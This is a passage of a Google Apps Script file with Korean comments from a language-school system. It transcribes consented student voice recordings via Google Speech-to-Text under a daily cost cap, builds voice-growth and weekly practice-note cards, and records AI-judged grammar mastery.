 *   ③ 인코딩: m4a(AAC)는 지원 목록에 없다. 폰 녹음이 m4a로 오면 여기서 걸린다 —
 *      MIME으로 먼저 거르고, 나머지는 encoding을 지정하지 않고 보내 API의 헤더 자동 인식에 맡긴다.
 *      실제 어느 포맷이 들어오는지는 첫 실측 전엔 알 수 없으므로 **상태 열에 원문 오류를 남겨** 판단 재료로 쓴다.
 *   ④ 유료 API다. 일일 상한(STT_DAILY_CAP)으로 폭주를 막고, 초과분은 다음 날로 미룬다. */
const STT_LANG = 'ko-KR';
const STT_DAILY_CAP = 30;                 // 하루 전사 상한 — 비용 폭주 방어(지출 2게이트 원칙)
const STT_MAX_BYTES = 10 * 1024 * 1024;   // 인라인 요청 한도
const STT_OK_MIME = ['audio/flac', 'audio/x-flac', 'audio/wav', 'audio/x-wav', 'audio/wave',
  'audio/mpeg', 'audio/mp3', 'audio/ogg', 'audio/webm', 'audio/amr', 'audio/3gpp'];
/* [v9.187] '급수'(맨 끝) — 녹음 시점의 학생 급수 스냅샷(제품방향 §불변식 2 「학생·레벨·시점」의 레벨 축).
 *   발음 데이터는 급수 층이 없으면 "초급의 더듬거림"과 "고급의 남은 억양"이 한 덩어리로 섞인다.
 * [v9.190] '미션ID'(맨 끝) — 과업 축(유호님 승인 08-06 · 스키마 감사 잔여 1건).
 *   '미션'은 자유 문자열이라 같은 과제가 다섯 표기로 쌓인다 — "무엇을 읽었을 때의 발음인가"로 묶을 수가 없다.
 *   맨 끝 증분이라 앞을 읽는 소비처(전사 7~9열·삭제 6열·점검 8열)는 전부 그대로다. */
// [v9.239] VOICE_LOG_HEADERS 정본은 엔진_셋업확장.js(골격 곁)로 이사 — 수집면 출생 단일화로 골격이
//   이 헤더를 참조하게 됐는데, 이 파일은 ENGINE_FILES(테스트 하네스·filePushOrder 선두 고정) 밖이라
//   정본이 엔진 쪽에 살아야 한다. 여기 쓰임(ensureSheet·헤더보정_)은 런타임 호출이라 로드 순서 무관.

/* GCP 액세스 토큰 — ①서비스 계정(GCP_SA_JSON) ②없으면 스크립트 자체 토큰(매니페스트에 스코프를 넣은 경우).
 * 토큰은 1시간짜리라 캐시에 50분 보관한다(매 파일마다 토큰 발급하면 그 자체가 쿼터·지연이다). */
function gcpAccessToken_() {
  const cache = CacheService.getScriptCache();
  const hit = cache.get('GCP_TOKEN');
  if (hit) return hit;
  const raw = PropertiesService.getScriptProperties().getProperty('GCP_SA_JSON');
  if (!raw) {
    try { return ScriptApp.getOAuthToken(); } catch (e) { return null; } // 스코프 미명시면 Speech가 403을 준다
  }
  let sa;
  try { sa = JSON.parse(raw); } catch (e) { throw new Error('GCP_SA_JSON 파싱 실패 — 서비스 계정 JSON 전체를 그대로 붙여넣으세요'); }
  if (!sa.client_email || !sa.private_key) throw new Error('GCP_SA_JSON에 client_email/private_key가 없습니다');
  const now = Math.floor(Date.now() / 1000);
  const b64 = o => Utilities.base64EncodeWebSafe(JSON.stringify(o)).replace(/=+$/, '');
  const head = b64({ alg: 'RS256', typ: 'JWT' });
  const claim = b64({ iss: sa.client_email, scope: 'https://www.googleapis.com/auth/cloud-platform',
    aud: 'https://oauth2.googleapis.com/token', exp: now + 3600, iat: now });
  const sig = Utilities.base64EncodeWebSafe(
    Utilities.computeRsaSha256Signature(head + '.' + claim, sa.private_key)).replace(/=+$/, '');
  const res = UrlFetchApp.fetch('https://oauth2.googleapis.com/token', {
    method: 'post', muteHttpExceptions: true,
    payload: { grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer', assertion: head + '.' + claim + '.' + sig }
  });
  if (res.getResponseCode() !== 200) throw new Error('토큰 발급 실패 ' + res.getResponseCode() + ': ' + res.getContentText().slice(0, 200));
  const tok = JSON.parse(res.getContentText()).access_token;
  if (tok) cache.put('GCP_TOKEN', tok, 3000);
  return tok;
}

/* 파일 1개 전사 — 성공 시 {text}, 실패 시 {err} (throw하지 않는다: 한 건 실패가 배치를 멈추면 안 된다) */
function sttOne_(fileId, token) {
  let blob;
  try { blob = DriveApp.getFileById(fileId).getBlob(); }
  catch (e) { return { err: '파일 접근 불가: ' + String(e).slice(0, 80) }; }
  const mime = String(blob.getContentType() || '').toLowerCase();
  if (mime && STT_OK_MIME.indexOf(mime) === -1) return { err: '미지원 포맷(' + mime + ') — m4a/AAC는 Speech-to-Text가 받지 않습니다' };
  const bytes = blob.getBytes();
  if (bytes.length > STT_MAX_BYTES) return { err: '파일 초과(' + Math.round(bytes.length / 1024 / 1024) + 'MB > 10MB) — 짧게 재녹음 필요' };
  const res = UrlFetchApp.fetch('https://speech.googleapis.com/v1/speech:recognize', {
    method: 'post', contentType: 'application/json', muteHttpExceptions: true,
    headers: { Authorization: 'Bearer ' + token },
    payload: JSON.stringify({
      // encoding·sampleRate는 지정하지 않는다 — 헤더가 있는 포맷은 API가 스스로 읽고,
      // 잘못 지정하면 오히려 인식이 깨진다. 못 읽는 포맷은 그 사유가 응답에 그대로 온다.
      config: { languageCode: STT_LANG, enableAutomaticPunctuation: true, model: 'default' },
      audio: { content: Utilities.base64Encode(bytes) }
    })
  });
  const code = res.getResponseCode();
  const body = res.getContentText();
  // [v9.125] systemic 플래그 — 401/403/429/5xx는 파일이 아니라 계정·설정·쿼터 문제라, 행에 낙인을 찍으면
  //   설정을 고쳐도 전 행을 손으로 되살려야 한다. 배치가 이 플래그를 보고 행을 '대기'로 남기고 즉시 중단한다.
  if (code !== 200) return { err: 'API ' + code + ': ' + body.replace(/\s+/g, ' ').slice(0, 200), systemic: (code === 401 || code === 403 || code === 429 || code >= 500) };
  let j;
  try { j = JSON.parse(body); } catch (e) { return { err: '응답 파싱 실패' }; }
  const text = (j.results || []).map(r => ((r.alternatives || [])[0] || {}).transcript || '').join(' ').trim();
  if (!text) return { err: '인식 결과 없음(무음·잡음·언어 불일치 가능)' };
  return { text: text };
}

// ── A-2c. voice_log 미전사 행 → STT (교재연동Nightly 편승) ──────────────
function voiceTranscribe_(ss) {
  const vl = ss.getSheetByName('voice_log');
  if (!vl || vl.getLastRow() < 2) return;
  // 열 확장 — 구 6열 시트도 그대로 살아야 하므로 헤더를 보장하고 나서 읽는다([v9.187] 공용 치유로 통일 — 로직 두 벌 방지)
  헤더보정_(vl, VOICE_LOG_HEADERS);

  const tz = ss.getSpreadsheetTimeZone();
  const st = ensureSheet(ss, 'app_state', ['key', 'value']);
  const today = Utilities.formatDate(new Date(), tz, 'yyyy-MM-dd');
  const usedRaw = String(getState(st, 'STT일일사용').val || '');
  const used = (usedRaw.split('|')[0] === today) ? (Number(usedRaw.split('|')[1]) || 0) : 0;
  let budget = STT_DAILY_CAP - used;
  if (budget <= 0) return;                                   // 오늘 몫 소진 — 내일 이어서

  // [v9.125] 🔒 동의 게이트 — 동의 문구가 보호하는 대상은 "목소리와 **그것을 글로 옮긴 기록**"인데,
  //   전사(외부 GCP 전송)만 게이트 밖이었다(v9.104 게이트 뒤에 생긴 소비자가 자동으로 구멍이 되는 구조).
  //   v9.104 이전에 무동의로 적재된 행도 여기서 걸러진다. 맵 실패(null)는 배치 전체 보류 — 판정 불가는 통과가 아니다.
  const consent = (typeof voiceConsentMap_ === 'function') ? voiceConsentMap_() : null;
  if (consent === null) { Logger.log('🎧 전사 보류 — 음성 동의 맵을 읽지 못했다(판정 불가는 보류)'); return; }

  const n = vl.getLastRow() - 1;
  const rows = vl.getRange(2, 1, n, VOICE_LOG_HEADERS.length).getValues();
  const todo = [];
  let noConsent = 0;
  rows.forEach((r, i) => {
    if (String(r[6] || '').trim()) return;                   // 이미 전사됨
    const state = String(r[7] || '').trim();
    if (state && state !== '대기') return;                   // 실패 사유가 있는 행은 자동 재시도하지 않는다(같은 오류로 과금 반복)
    if (!String(r[4] || '').trim()) return;                  // file_id 없음
    const sid = String(r[0] || '').trim();
    if (consent[sid] !== 'yes') { noConsent++; return; }     // [v9.125] 동의 확인 안 된 행은 전사하지 않는다(행은 '대기' 유지 — 동의가 확인되면 다음 밤 자동 진행)
    todo.push({ row: i + 2, fid: String(r[4]).trim(), sid: sid });
  });
  if (noConsent) Logger.log('🎧 전사 보류 ' + noConsent + '행 — 음성 동의 미확인(동의 확인 시 자동 재개)');
  if (!todo.length) return;

  let token;
  try { token = gcpAccessToken_(); }
  catch (e) {
    adminMail('[SYNK] 🎧 STT 토큰 실패 — 전사 보류', String(e) + '\n\nvoiceSttStatus() ▶ 로 설정 상태를 확인하세요.');
    return;
  }
  if (!token) { adminMail('[SYNK] 🎧 STT 미설정 — 전사 보류', 'GCP_SA_JSON 스크립트 속성이 없습니다. docs/STT_설치_v9107.md의 STEP 1~3을 따르세요.'); return; }

  // [v9.125] 리허설 게이트 — 유료 외부 API. 대기량만 보고하고 아무것도 보내지 않는다.
  if (typeof isRehearsal_ === 'function' && isRehearsal_()) {
    if (typeof rehearsalNote_ === 'function') rehearsalNote_('STT 전사: 대기 ' + todo.length + '건 전량 차단(비용 0)');
    return;
  }

  let ok = 0, fail = 0, aborted = '';
  const errSample = [];
  const batch = todo.slice(0, budget);
  for (let bi = 0; bi < batch.length; bi++) {
    const t = batch[bi];
    const r = sttOne_(t.fid, token);
    const stamp = Utilities.formatDate(new Date(), tz, 'yyyy-MM-dd HH:mm');
    if (r.text) { vl.getRange(t.row, 7, 1, 3).setValues([[r.text, '완료', stamp]]); ok++; }
    else if (r.systemic) {
      // [v9.125] 계정·설정·쿼터 오류(401/403/429/5xx) — 행에 낙인을 찍지 않고('대기' 유지) 배치를 즉시 중단.
      //   구 코드는 설정 실수 하나로 그날 대기 전 행이 '실패:'로 영구 낙인돼 수기 복구가 필요했다.
      aborted = r.err;
      break;
    }
    else { vl.getRange(t.row, 7, 1, 3).setValues([['', '실패: ' + r.err, stamp]]); fail++; if (errSample.length < 5) errSample.push(t.sid + ' — ' + r.err); }
  }
  setState(st, 'STT일일사용', today + '|' + (used + ok + fail + (aborted ? 1 : 0)));
  if (aborted) {
    adminMail('[SYNK] 🎧 STT 전사 중단 — 계정·설정 문제(행 낙인 없음)',
      '오류: ' + aborted + '\n\n파일이 아니라 계정·API·쿼터 쪽 문제라 대기 행을 그대로 두고 중단했습니다.\n' +
       'voiceSttStatus() ▶ 로 원인을 확인해 고치면 다음 밤에 자동 재개됩니다(수기 복구 불필요).');
    return;
  }
  if (ok || fail) adminMail('[SYNK] 🎧 목소리 전사 ' + ok + '건' + (fail ? ' · 실패 ' + fail + '건' : ''),
    '전사 완료 ' + ok + '건, 실패 ' + fail + '건 (오늘 사용 ' + (used + ok + fail) + '/' + STT_DAILY_CAP + ')\n' +
    (errSample.length ? '\n실패 사유(최대 5건):\n' + errSample.join('\n') +
      '\n\n※ 실패 행은 자동 재시도하지 않습니다(같은 오류로 과금이 반복되므로). 원인을 고친 뒤 voice_log의 「전사상태」 칸을 비우면 다음 밤에 다시 시도합니다.' : ''));
}

/* [v9.107] STT 설정 진단 — "왜 전사가 안 되지"를 추측이 아니라 실측으로 답한다.
 * 실제로 1바이트짜리 요청을 보내 응답 코드를 그대로 보여준다(권한·API 활성화·결제 문제가 여기서 갈린다). */
function voiceSttStatus() {
  const L = ['🎧 STT 설정 진단'];
  const raw = PropertiesService.getScriptProperties().getProperty('GCP_SA_JSON');
  L.push('1) 서비스 계정 키(GCP_SA_JSON): ' + (raw ? '있음' : '없음 — 스크립트 속성에 추가 필요'));
  let token = null;
  try { token = gcpAccessToken_(); L.push('2) 액세스 토큰: ' + (token ? '발급 성공' : '발급 실패(null)')); }
  catch (e) { L.push('2) 액세스 토큰: ❌ ' + String(e).slice(0, 200)); }
  if (token) {
    // 빈 오디오로 호출 — 400이면 인증·API는 정상(요청 내용만 문제), 403이면 권한·활성화 문제
    const res = UrlFetchApp.fetch('https://speech.googleapis.com/v1/speech:recognize', {
      method: 'post', contentType: 'application/json', muteHttpExceptions: true,
      headers: { Authorization: 'Bearer ' + token },
      payload: JSON.stringify({ config: { languageCode: STT_LANG }, audio: { content: '' } })
    });
    const c = res.getResponseCode();
    L.push('3) Speech API 응답: ' + c + (c === 400 ? ' ✅ (인증·API 정상 — 빈 오디오라 400이 정상 응답)'
      : c === 403 ? ' ❌ API 미활성화이거나 서비스 계정에 권한이 없습니다'
      : c === 401 ? ' ❌ 토큰이 거부됐습니다' : ''));
    if (c !== 400) L.push('   응답 원문: ' + res.getContentText().replace(/\s+/g, ' ').slice(0, 300));
  }
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const vl = ss.getSheetByName('voice_log');
  if (vl && vl.getLastRow() >= 2 && vl.getLastColumn() >= 8) {
    const rows = vl.getRange(2, 1, vl.getLastRow() - 1, 8).getValues();
    const done = rows.filter(r => String(r[6] || '').trim()).length;
    const failed = rows.filter(r => String(r[7] || '').indexOf('실패') === 0).length;
    L.push('4) voice_log: 전체 ' + rows.length + '행 · 전사 완료 ' + done + ' · 실패 ' + failed + ' · 대기 ' + (rows.length - done - failed));
    rows.filter(r => String(r[7] || '').indexOf('실패') === 0).slice(0, 3)
      .forEach(r => L.push('   실패 예: ' + r[0] + ' — ' + r[7]));
  } else L.push('4) voice_log: 없음 또는 비어 있음(전사할 대상 0)');
  const msg = L.join('\n');
  Logger.log(msg);
  return msg;
}

// ── A-3. 성장 카드(처음 vs 최신, 간격 21일+) → profiles '목소리성장카드' 열 ──
function buildVoiceGrowthCards_(ss) {
  const vl = ss.getSheetByName('voice_log');
  const pf = ss.getSheetByName('profiles');
  if (!vl || !pf || vl.getLastRow() < 2 || pf.getLastRow() < 2) return;
  const tz = ss.getSpreadsheetTimeZone();
  const byStu = {}; // sid → {first:{t,url,mission,text}, last:{...}, cnt}
  // [v9.107] 폭을 전사 열까지 넓힌다 — 구 6열 시트도 살아야 하므로 실제 폭 기준(없는 칸은 undefined→'')
  const wV = Math.max(vl.getLastColumn(), 4);
  vl.getRange(2, 1, vl.getLastRow() - 1, wV).getValues().forEach(r => {
    const sid = String(r[0] || '').trim();
    if (!sid || !r[1] || !r[3]) return;
    const t = asDate_(r[1]).getTime();
    const rec = { t: t, url: String(r[3]), mission: String(r[2] || ''), text: String(r[6] || '').trim() };
    const s = byStu[sid] = byStu[sid] || { cnt: 0 };
    s.cnt++;
    if (!s.first || t < s.first.t) s.first = rec;
    if (!s.last || t >= s.last.t) s.last = rec;
  });
  const n = pf.getLastRow() - 1;
  const ids = pf.getRange(2, 1, n, 1).getValues();
  const out = ids.map(r => {
    const s = byStu[String(r[0] || '').trim()];
    if (!s || s.cnt < 2) return [''];
    const days = Math.round((s.last.t - s.first.t) / 86400000);
    if (days < TB_GROWTH_MIN_DAYS) return [''];
    const d1 = Utilities.formatDate(new Date(s.first.t), tz, 'M/d');
    const d2 = Utilities.formatDate(new Date(s.last.t), tz, 'M/d');
    /* [v9.107] 전사문 병기 — 목소리 타임랩스는 여태 "듣기 링크 두 개"였다. 링크는 눌러야 비교되고,
     *   두 파일을 번갈아 듣는 사람은 거의 없다. 전사문이 있으면 **눈으로 한 번에 대비**된다
     *   ("처음엔 이렇게 말했고, 오늘은 이렇게 말한다") — STT가 성장 서사에 실제로 값을 내는 지점.
     *   전사가 없는 구간(미설정·실패·포맷 미지원)에서는 그 줄만 조용히 빠지고 카드는 그대로 산다. */
    /* [v9.155] 🔒 `[듣기](url)` 링크 제거 — 그 URL이 곧 공개 링크였다(위 voiceSweep_ 참조).
     *   v9.107이 전사문을 넣으며 적은 판단이 이 제거의 근거다: **값은 재생이 아니라 대비**이고,
     *   전사문이 그 대비를 눈으로 한 번에 보여준다. 링크를 빼도 카드의 값은 그대로 남는다.
     *   ⚠ 전사가 아직 없는 구간(STT 미설정·실패)에서는 날짜·미션만 남는다 — 그래도 「며칠의 거리」는 산다. */
    const q = (t) => t ? '\n> “' + (t.length > 140 ? t.slice(0, 140) + '…' : t) + '”' : '';
    return ['## 🎧 나의 목소리 타임랩스\n\n' +
      '**' + d1 + ' 처음의 나**' + (s.first.mission ? ' · ' + s.first.mission : '') + q(s.first.text) + '\n\n' +
      '**' + d2 + ' 오늘의 나**' + (s.last.mission ? ' · ' + s.last.mission : '') + q(s.last.text) + '\n\n' +
      days + '일의 거리만큼 목소리가 자랐어요. 다음 무대에서 또 만나요! 🎤'];
  });
  const col = tbProfileCol_(pf, '목소리성장카드');
  if (col) writeIfChanged(pf, 2, col, out);
}

// ── B. 연습 노트(주 1회) → profiles '연습노트' 열 ─────────────────────────
//   재료: mastery_log '연습'(미도달 문법) + aiWeakMap_(강사 메모 14일 + 최근 첨삭 포인트)
//   AI 호출 0 — 전부 기존 데이터의 재조립. 문법→교재 과 매핑 = TB_GRAMMAR_LESSON.
function buildFocusNotes_(ss) {
  const pf = ss.getSheetByName('profiles');
  if (!pf || pf.getLastRow() < 2) return;

  // 문법 이름 사전(GRAMMAR_BANK는 Code.js 전역 — 함수 안 접근 규칙 준수)
  const gName = {};
  try { GRAMMAR_BANK.forEach(g => { gName[g[0]] = g[1]; }); } catch (e) {}

  // 학생별 미도달('연습') 문법 — upsert 시트라 마지막 상태가 정본
  const practicing = {}; // sid → [grammar_id...]
  const ml = ss.getSheetByName('mastery_log');
  if (ml && ml.getLastRow() >= 2) {
    const st = {}; // sid|gid → 상태(뒤 행이 최신)
    ml.getRange(2, 1, ml.getLastRow() - 1, 3).getValues().forEach(r => {
      const sid = String(r[0] || '').trim(), gid = String(r[1] || '').trim();
      if (sid && gid) st[sid + '|' + gid] = String(r[2] || '');
    });
    Object.keys(st).forEach(k => {
      if (st[k] !== '연습') return;
      const p = k.split('|');
      (practicing[p[0]] = practicing[p[0]] || []).push(p[1]);
    });
  }
  let weak = {};
  try { weak = aiWeakMap_(ss); } catch (e) {} // 강사 메모+첨삭 — Code.js 로더 재사용

  const n = pf.getLastRow() - 1;
  const ids = pf.getRange(2, 1, n, 4).getValues();
  const out = ids.map(r => {
    const sid = String(r[0] || '').trim();
    if (!sid || r[3] !== 'student') return [''];
    const gids = (practicing[sid] || []).slice(0, TB_NOTE_MAX);
    const memos = (weak[sid] || []).slice(-1); // 가장 최근 코치 문구 1건만(소음 방지)
    if (!gids.length && !memos.length) return [''];
    let md = '## 📖 내 연습 노트 — 이번 주\n\n';
    if (gids.length) {
      md += gids.map((g, i) => (i + 1) + '. **' + (gName[g] || g) + '**' +
        (TB_GRAMMAR_LESSON[g] ? ' — ' + TB_GRAMMAR_LESSON[g] + ' 다시 펴기' : '')).join('\n') + '\n\n';
    }
    if (memos.length) md += '💬 최근 코치: ' + memos[0] + '\n\n';
    md += '이것만 잡으면 다음 진화가 가까워져요 ⚡';
    return [md];
  });
  /* 🔴 배포 순서에 안 기댄다 — 코드가 먼저 나가고 setupTextbookLink 가 아직 안 돌면
   *   새 이름 열이 없어 col=0 이 되고, 노트가 **조용히 멈춘다**(에러도 안 난다).
   *   그래서 여기서 옛 이름을 찾아 그 자리에서 헤더만 갈아 끼운다 — 값·열 위치는 그대로다.
   *   설치를 다시 돌리든 안 돌리든 같은 결과가 되는 자리(v9.229 개명). */
  let col = tbProfileCol_(pf, '연습노트');
  if (!col) {
    const 옛 = tbProfileCol_(pf, '필살기노트');
    if (옛) { pf.getRange(1, 옛).setValue('연습노트'); col = 옛; }
  }
  if (col) writeIfChanged(pf, 2, col, out);
}

// ── C. AI 문법 판정 [v9.59] — 숙제 문장 → mastery_log 자동 축적(교사 손 0) ──
//   흐름: hw_feedback 신규 행(포인터) → 학생별 문장 묶음 → aiCall_(Code.js 공용 헬퍼) 1회/학생
//        → 올바르게 쓴 문법 = '연습' 기록, 서로 다른 날 2회째 = '도달' 승격(우연 1회 방지)
//        → 틀리게 시도한 문법 = '연습'만(강등 없음 — 기존 단방향 상향 원칙 그대로)
//   보수 판정 원칙: "명백히 사용된 것만" — 진화 게이트의 무결성이 관대함보다 중요하다.
function masteryFromFeedback_(ss) {
  const apiKey = PropertiesService.getScriptProperties().getProperty('CLAUDE_API_KEY');
  if (!apiKey) return; // 키 없으면 0초 스킵(전 AI 기능 공통 스위치 원칙)
  const fb = ss.getSheetByName('hw_feedback');
  if (!fb || fb.getLastRow() < 2) return;
  const props = PropertiesService.getScriptProperties();
  const last = fb.getLastRow();
  const from = Number(props.getProperty('문법판정_포인터')) || 1;
  if (from >= last) { if (from > last) props.setProperty('문법판정_포인터', String(last)); return; }
  const tz = ss.getSpreadsheetTimeZone();
  const today = Utilities.formatDate(new Date(), tz, 'yyyy-MM-dd');

  // 신규 첨삭 행에서 학생별 제출문 묶기(D열=제출문)
  const rows = fb.getRange(from + 1, 1, last - from, 4).getValues();
  const bySid = {};
  rows.forEach(r => {
    const sid = String(r[1] || '').trim(), text = String(r[3] || '').trim();
    if (!sid || !text) return;
    bySid[sid] = ((bySid[sid] || '') + '\n' + text).slice(-TB_JUDGE_TEXT_CAP);
  });
  const sids = Object.keys(bySid).slice(0, TB_JUDGE_MAX_PER_RUN);
  if (!sids.length) { props.setProperty('문법판정_포인터', String(last)); return; }

  // 판정 대상 문법 목록 — GRAMMAR_BANK(Code.js 전역)의 G2xx·G3xx만(진화 1~3단계 스코프, 프롬프트 압축)
  const bankList = [];
  try { GRAMMAR_BANK.forEach(g => { if (/^G[23]/.test(g[0])) bankList.push(g[0] + '=' + g[1]); }); } catch (e) { return; }
  if (!bankList.length) return;
  const schema = {
    type: 'object', additionalProperties: false, required: ['used', 'wrong'],
    properties: {
      used: { type: 'array', items: { type: 'string' }, description: '학생이 명백히 올바르게 사용한 문법 ID만(확신 없으면 제외)' },
      wrong: { type: 'array', items: { type: 'string' }, description: '사용을 시도했으나 틀린 문법 ID만' }
    }
  };
  const system = '한국어 교육 문법 판정관. 학생 문장에서 아래 문법 항목의 사용 여부를 보수적으로 판정한다. ' +
    '명백한 것만 담고, 애매하면 제외한다. 목록에 없는 ID는 절대 만들지 않는다.';

  // mastery_log upsert 준비 — (sid|gid) → {row, 상태, 마지막근거일}
  const ml = ensureSheet(ss, 'mastery_log', MASTERY_LOG_HEADERS); // [v9.239] 헤더 정본 공유(엔진_셋업확장)
  const idx = {};
  if (ml.getLastRow() >= 2) ml.getRange(2, 1, ml.getLastRow() - 1, 7).getValues().forEach((r, i) => {
    const sid = String(r[0] || '').trim(), gid = String(r[1] || '').trim();
    if (sid && gid) idx[sid + '|' + gid] = { row: i + 2, st: String(r[2] || ''), d: dstr(r[6] || r[3], tz) };
  });
  const validGid = {};
  bankList.forEach(s => { validGid[s.split('=')[0]] = 1; });

  let judged = 0, reached = 0;
  const append = [];
  for (const sid of sids) {
    let out;
    try {
      out = aiCall_(apiKey, system,
        '문법 목록(ID=이름):\n' + bankList.join('\n') + '\n\n학생 문장:\n' + bySid[sid],
        schema, 2048);
    } catch (e) { Logger.log('문법판정 실패(' + sid + '): ' + e); continue; } // 학생 단위 격리 — 다음 학생 계속
    judged++;
    const mark = (gid, correct) => {
      if (!validGid[gid]) return; // AI가 지어낸 ID 차단
      const k = sid + '|' + gid, ex = idx[k];
      if (!ex) { // 첫 근거 — '연습'으로 입장
        append.push([sid, gid, '연습', today, '', correct ? 'AI첨삭' : 'AI첨삭(오류)', new Date()]);
        idx[k] = { row: 0, st: '연습', d: today };
        return;
      }
      if (ex.st === '도달') return; // 단방향 상향 — 강등 없음
      if (correct && ex.d && ex.d !== today) { // 서로 다른 날 2회째 올바름 = 도달
        if (ex.row) { ml.getRange(ex.row, 3, 1, 5).setValues([['도달', ml.getRange(ex.row, 4).getValue() || today, today, 'AI첨삭', new Date()]]); reached++; }
        ex.st = '도달';
      } else if (ex.row) { ml.getRange(ex.row, 7).setValue(new Date()); ex.d = today; } // 근거일 갱신
    };
    (out.used || []).forEach(g => mark(String(g).trim(), true));
    (out.wrong || []).forEach(g => mark(String(g).trim(), false));
  }
  if (append.length) ml.getRange(ml.getLastRow() + 1, 1, append.length, 7).setValues(append);
  // 포인터는 이번에 판정한 학생 수와 무관하게 전진 — 남은 학생은 다음 제출 때 자연 재판정(단순성 우선)
  props.setProperty('문법판정_포인터', String(last));
  if (judged) Logger.log('✅ 문법 판정 ' + judged + '명 · 신규 기록 ' + append.length + ' · 도달 승격 ' + reached);
}
